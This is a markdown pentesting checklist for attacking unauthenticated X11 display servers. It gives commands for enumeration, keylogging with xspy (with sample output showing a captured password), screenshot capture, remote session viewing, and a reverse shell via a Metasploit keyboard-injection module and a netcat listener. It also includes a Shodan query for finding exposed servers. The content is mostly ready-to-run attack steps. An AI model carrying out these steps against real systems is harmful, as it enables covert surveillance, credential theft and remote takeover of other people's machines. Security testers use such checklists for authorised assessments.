# X11 Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating X11 (port 6000), I realistically expect to find:

- [ ] Unauthenticated access to the X server
- [ ] Ability to view GUI sessions remotely
- [ ] Ability to capture keystrokes (keylogging)
- [ ] Screenshot or screen capture capabilities
- [ ] Possibility of executing commands through keyboard injection
- [ ] Potential reverse shell via X server abuse

---

## ‚úÖ X11 Pentest Checklist

- [ ] **Banner Grabbing & Access Check**
  - Test for anonymous connection.
    ```
    nmap -sV --script x11-access -p6000 <IP>
    msf> use auxiliary/scanner/x11/open_x11
    ```

---

- [ ] **Verify Connection**
  - Check display information.
    ```
    xdpyinfo -display <IP>:0
    xwininfo -root -tree -display <IP>:0
    ```

---

- [ ] **Keylogging**
  - Capture keystrokes using xspy.
    ```
    xspy <IP>
    ```
  - Sample output:
    ```
    swaBackSpaceCaps_Lock userTabpassword
    ```

---

- [ ] **Screenshot Capture**
  - Grab a screenshot of the target display.
    ```
    xwd -root -screen -silent -display <IP>:0 > screenshot.xwd
    convert screenshot.xwd screenshot.png
    ```

---

- [ ] **Remote Desktop View**
  - Use xrdp.py to get a remote session view.
    ```
    ./xrdp.py <IP>:0
    ```
  - Alternative method with window ID:
    ```
    xwininfo -root -display <IP>:0
    ./xwatchwin <IP>:0 -w <windowID>
    ```

---

- [ ] **Get Reverse Shell**
  - Metasploit module for keyboard injection shell.
    ```
    msf> use exploit/unix/x11/x11_keyboard_exec
    ```
  - Reverse shell via xrdp.py:
    ```
    ./xrdp.py <IP>:0 --no-disp
    ```
    - Start Netcat listener:
      ```
      nc -lvnp 5555
      ```

---

## ‚úÖ Shodan Search

- [ ] Discover exposed X11 servers.
    ```
    port:6000 x11
    ```

---

## ‚úÖ References

- [Exploiting X11 Unauthenticated Access](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)
- [Bitvijays LFF-IPS-P2](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
